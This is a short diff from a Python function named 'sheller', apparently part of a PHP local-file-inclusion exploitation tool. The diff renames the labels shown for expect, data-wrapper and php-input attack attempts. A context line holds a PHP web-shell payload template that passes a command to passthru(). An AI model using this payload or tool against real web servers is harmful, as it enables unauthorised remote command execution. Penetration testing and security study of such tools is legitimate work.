@@ -1080,12 +1080,12 @@ def sheller(
 
             namesPart1 = [
                 "expect:               ",
-                "data.system():        ",
-                "data.exec():          ",
-                "data.passthru():      ",
-                "data.b64.system():    ",
-                "data.b64.exec():      ",
-                "data.b64.passthru():  "
+                "data.plain.system():  ",
+                "data.plain.exec():    ",
+                "data.plain.passthru():",
+                "data.ncode.system():  ",
+                "data.ncode.exec():    ",
+                "data.ncode.passthru():",
             ]
 
             for i in range(0, len(wrappersPart1)):
@@ -1152,9 +1152,9 @@ def sheller(
                 '<?php passthru("{}"); ?>'.format(PAYLOAD),
             ]
             names = [
-                "php input.system():   ",
-                "php input.exec():     ",
-                "php input.passthru(): "
+                "input.system():       ",
+                "input.exec():         ",
+                "input.passthru():     ",
             ]
             for i in range(0, len(payloads)):
                 sys.stdout.write("{0}  : {2}{1}".format(
